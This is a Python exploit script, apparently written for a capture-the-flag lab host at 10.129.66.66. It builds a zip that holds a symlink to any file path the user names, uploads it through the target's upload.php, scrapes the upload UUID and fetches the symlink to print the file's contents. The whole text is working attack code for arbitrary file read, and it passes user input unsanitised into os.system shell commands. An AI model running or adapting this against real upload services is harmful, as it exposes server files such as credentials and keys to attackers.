
##
##

from bs4 import BeautifulSoup
import requests
import os,sys,re

##
##

if not os.path.exists("tmp"):
os.mkdir("tmp")
file_to_read = input("File to read: ")
print("Creating symlink..")
os.chdir("tmp/")
os.system(f"ln -s {file_to_read} symlink.pdf")
print("Zipping..")
os.system(f"zip -r --symlinks sym.zip symlink.pdf")
os.system(f"rm symlink.pdf && cp sym.zip ../")
print("Done! Zip file: sym.zip")
print("Uploading file..")

##
##
MIP = "10.129.66.66"
##
##

file = {
'zipFile': ('sym.zip'
, open('sym.zip'
,
'rb'),
'application/zip'),
'submit': (None,
'')
}
headers = {"Host":MIP,
"User-Agent":"Mozilla/5.0 (X11;
Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"}
s = requests.Session()
r = s.get(f"http://{MIP}"
,headers=headers)
r = s.get(f"http://{MIP}/upload.php"
, headers=headers)
r = s.post(f"http://{MIP}/upload.php"
,files=file,
headers=headers)
soup = BeautifulSoup(r.text,features="lxml")
uuid=""
for a in soup.find_all("a"
,href=True):
if "uploads" in a['href']:
uuid = a['href'].split("/")[1]
print("File UUID: "
,uuid)
print("\nReading file..")
r = s.get(f"http://{MIP}/uploads/{uuid}/symlink.pdf")
print(r.text)

##
##
